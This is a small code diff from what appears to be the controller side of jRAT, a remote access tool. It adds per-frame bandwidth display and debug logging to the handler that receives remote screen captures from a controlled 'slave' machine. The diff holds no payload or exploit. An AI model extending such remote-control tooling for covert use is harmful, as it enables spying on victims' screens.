@@ -1,6 +1,7 @@
 package io.jrat.client.packets.incoming;
 
 import io.jrat.client.Cursor;
+import io.jrat.client.Main;
 import io.jrat.client.Slave;
 import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.client.ui.frames.FrameRemoteScreen;
@@ -29,9 +30,13 @@ public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {
 				Cursor.drawCursor(slave.getOS(), imageGraphics, mouseX, mouseY);
 				
 				frame.drawOverlay(image);
+				frame.setBlockSizeLabel(frame.getTransmitted() / 1024);
+				Main.debug("Transmitted " + (frame.getTransmitted() / 1024) + " kb in one frame");
+				frame.setTransmitted(0);
 			}
             if (frame.isRunning()) {
                 slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor(), frame.getColumns(), frame.getRows()));
+				frame.setTransmitted(0);
             }
 		}
 	}
